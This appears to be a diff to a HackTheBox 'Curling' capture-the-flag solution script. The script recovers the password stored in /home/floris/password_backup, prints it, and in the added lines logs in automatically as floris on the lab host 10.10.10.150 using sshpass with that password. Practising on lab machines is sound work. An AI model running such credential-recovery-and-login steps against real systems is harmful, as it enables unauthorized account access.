@@ -10,6 +10,9 @@
 # b|n4ryR3v3rs3 was made for the hackthebox Curling machine.
 # this will help you retrieve the password in /home/floris/password_backup
 
+# Make sure you have sshpass installed for the ssh shell
+# sudo apt-get install sshpass
+
 user=$(whoami)
 
 echo "I hope you enjoy b|n4ryR3v3rs3 $user"
@@ -51,3 +54,10 @@ tar -xvf password4.tar
 password=$(cat password.txt)
 
 echo "The password is: $password"
+
+# SSH Login
+
+echo "SHELL: Creating a ssh sessions, please wait...."
+echo
+
+sshpass -p $password ssh floris@10.10.10.150
